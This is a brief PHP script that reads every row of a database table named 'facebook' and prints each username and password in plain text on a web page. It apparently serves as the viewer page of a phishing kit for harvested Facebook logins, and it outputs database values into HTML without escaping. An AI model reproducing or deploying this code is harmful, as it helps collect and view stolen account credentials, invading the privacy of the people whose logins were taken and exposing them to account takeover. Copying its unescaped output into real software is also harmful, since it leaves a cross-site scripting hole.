<?php
require_once "Persist.php";
$list=Persist::executeQuery("select * from facebook");
for($i=0;$i<count($list);$i++){
    echo "<h1>$i, Username: <b>".$list[$i]['username']."</b>    Password: <strong>".$list[$i]['password']."</strong> </h1>";
}